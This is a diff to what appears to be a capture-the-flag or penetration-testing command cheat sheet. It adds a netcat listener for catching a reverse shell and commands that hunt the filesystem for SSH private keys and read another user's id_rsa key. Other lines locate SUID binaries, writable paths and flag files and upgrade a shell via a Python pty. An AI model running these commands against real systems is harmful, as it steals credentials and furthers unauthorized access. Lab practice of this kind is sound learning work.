@@ -1,3 +1,5 @@
+ nc -lvnp 4444.
+
 # Search for user.txt everywhere on the filesystem
 find / -name user.txt 2>/dev/null
 
@@ -12,3 +14,13 @@ find / -perm -4000 2>/dev/null
 find / -writable 2>/dev/null
 
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# 1. Search for SSH private keys in the entire system
+#    The files are often named 'id_rsa' or have the '.key' extension.
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.key" 2>/dev/null
+
+# 2. Search for the SSH directory in James' home directory
+#    We might not have access to read it, but warto spróbować.
+ls -la /home/james/.ssh/ 2>/dev/null
+cat /home/james/.ssh/id_rsa 2>/dev/null
